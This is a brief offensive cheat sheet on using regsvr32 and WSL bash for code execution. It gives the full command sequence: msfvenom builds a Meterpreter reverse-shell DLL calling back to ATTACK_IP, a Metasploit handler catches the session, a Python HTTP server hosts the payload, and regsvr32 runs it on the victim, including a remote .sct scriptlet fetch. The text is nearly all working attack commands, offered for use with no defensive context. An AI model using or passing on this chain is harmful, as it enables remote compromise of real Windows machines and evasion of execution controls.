### Tools: regsvr32, Bash

# REGSVR32

#### 1) msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACK_IP LPORT=PORT -f dll -a x86 > example.dll

#### 2) msfconsole -q

#### 3) use exploit/multi/handler

#### 4) set payload windows/meterpreter/reverse_tcp

#### 5) set LHOST IP

#### 6) set LPORT PORT

#### 7) exploit

#### 8) python3 -m http.server PORT 

#### 9) Victim: regsvr32.exe c:\path\to\example.dll OR 

#### regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\example.dll

## BASH 

#### bash -c calc.exe (Require Windows Subsystem Linux (WSL) to use bash)
